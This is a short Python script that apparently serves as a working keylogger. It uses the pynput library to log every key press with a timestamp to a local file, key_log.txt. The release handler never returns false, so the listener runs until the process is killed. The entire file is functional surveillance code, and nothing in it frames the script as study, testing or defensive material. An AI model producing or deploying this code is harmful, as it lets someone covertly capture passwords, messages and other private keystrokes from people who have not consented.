import logging

from pynput import keyboard

log_dir = "key_logs"
logging.basicConfig(filename=("key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(key.char)
    except AttributeError:
        logging.info(key)

def on_release(key): 
    if False: return False  

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener: listener.join()
